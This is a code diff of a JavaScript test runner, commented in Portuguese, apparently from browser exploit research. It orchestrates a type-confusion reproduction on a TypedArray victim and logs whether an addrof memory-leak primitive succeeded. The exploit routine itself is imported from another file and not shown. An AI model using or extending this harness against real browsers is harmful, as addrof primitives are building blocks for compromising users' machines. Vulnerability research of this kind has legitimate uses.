@@ -2,39 +2,43 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import {
-    executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDetailsObject,
-    FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO
-} from './testArrayBufferVictimCrash.mjs'; // NOME DA FUNÇÃO E MÓDULO ATUALIZADOS E IMPORTADOS
+    executeTypedArrayVictimAddrofTest_ForceNumericLeakInConfusedDetails, // NOME DA FUNÇÃO ATUALIZADO
+    FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD // NOME DO MÓDULO ATUALIZADO
+} from './testArrayBufferVictimCrash.mjs';
 
 async function runHeisenbugReproStrategy_TypedArrayVictim() {
-    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_LeakObjectsViaConfusedDetailsObject";
-    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (LeakObjectsViaConfusedDetailsObject) ====`, 'test', FNAME_RUNNER);
+    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ForceNumericLeakInConfusedDetails";
+    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (ForceNumericLeakInConfusedDetails) ====`, 'test', FNAME_RUNNER);
 
-    const result = await executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDetailsObject();
+    const result = await executeTypedArrayVictimAddrofTest_ForceNumericLeakInConfusedDetails();
 
     logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
     if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
-        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
+        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis)}`, "dev_verbose");
     }
 
-    if (result.errorCapturedMain) {
-        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
-        document.title = `Heisenbug (TypedArray-LOVCDO) ERR: ${result.errorCapturedMain.name}`;
-        if (result.errorCapturedMain.name === 'TypeError' && result.errorCapturedMain.message.includes("circular structure")) {
+    if (result.errorOccurred) {
+        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
+        document.title = `Heisenbug (TypedArray-FNLCD) ERR: ${result.errorOccurred.name}`;
+        if (result.errorOccurred.name === 'TypeError' && result.errorOccurred.message.includes("circular structure")) {
             logS3(`    NOTA: TypeError de estrutura circular. Isso é esperado se o objeto C1 modificado foi serializado com sucesso pelo stringify principal e depois novamente pelo logger do runner.`, "info");
         }
     } else {
-        logS3(`  RESULTADO: Completou. Estado final do objeto C1_details (snapshot): ${result.toJSON_details ? JSON.stringify(result.toJSON_details, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);
-        logS3(`  Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "info", FNAME_RUNNER);
+        logS3(`  RESULTADO: Completou. Estado final do objeto C1_details (retornado por P1, modificado em P2+): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
+        logS3(`  Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
 
-        let heisenbugAndWriteOnC1Confirmed = false;
-        // A confirmação da Heisenbug agora é se o resultado da sonda indica que os payloads foram atribuídos ao C1_details
+        let heisenbugOnC1 = false;
+        // A confirmação da Heisenbug agora é se o C1 (stringifyOutput_parsed) contém os payloads
+        // ou se a sonda confirmou a atribuição numérica
         const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2);
-        if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned_to_C1_this && call2Details.payload_B_assigned_to_C1_this) {
-            heisenbugAndWriteOnC1Confirmed = true;
-            logS3(`  !!!! TYPE CONFUSION E ESCRITA NO OBJETO C1_DETAILS CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
+        if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned_as_num) {
+            heisenbugOnC1 = true;
+        }
+
+        if(heisenbugOnC1){
+            logS3(`  !!!! HEISENBUG & ATRIBUIÇÃO NUMÉRICA CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
         } else {
-            logS3(`  ALERT: Type Confusion ou escrita de payloads no C1_details NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
+            logS3(`  ALERT: Heisenbug/Atribuição Numérica NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
         }
 
         let anyAddrofSuccess = false;
@@ -59,21 +63,21 @@ async function runHeisenbugReproStrategy_TypedArrayVictim() {
         }
 
         if (anyAddrofSuccess) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: AddrInC1 SUCCESS!`;
-        } else if (heisenbugAndWriteOnC1Confirmed) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: C1_TC&Write OK, Addr Fail`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}: AddrInC1 SUCCESS!`;
+        } else if (heisenbugOnC1) {
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}: C1_TC OK, Addr Fail`;
         } else {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: No C1_TC?`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}: No C1_TC?`;
         }
     }
     logS3(`  Título da página: ${document.title}`, "info");
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`==== Estratégia de Reprodução do Heisenbug (LeakObjectsViaConfusedDetailsObject) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Estratégia de Reprodução do Heisenbug (ForceNumericLeakInConfusedDetails) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}_MainOrchestrator`;
+    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}_MainOrchestrator`;
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
@@ -81,19 +85,18 @@ export async function runAllAdvancedTestsS3() {
     if (outputDiv) outputDiv.innerHTML = '';
 
     logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
-    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (LeakObjectsViaConfusedDetailsObject) ====`, 'test', FNAME_ORCHESTRATOR);
+    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ForceNumericLeakInConfusedDetails) ====`, 'test', FNAME_ORCHESTRATOR);
 
     await runHeisenbugReproStrategy_TypedArrayVictim();
 
     logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
     if (runBtn) runBtn.disabled = false;
 
-    // Atualização final do título, caso nenhuma condição mais específica tenha sido atendida
-    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO)) {
+    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD)) {
         if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
             !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
-            !document.title.includes("ERR") && !document.title.includes("C1_TC&Write OK")) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} Concluído`;
+            !document.title.includes("ERR") && !document.title.includes("C1_TC OK")) {
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD} Concluído`;
         }
     }
 }
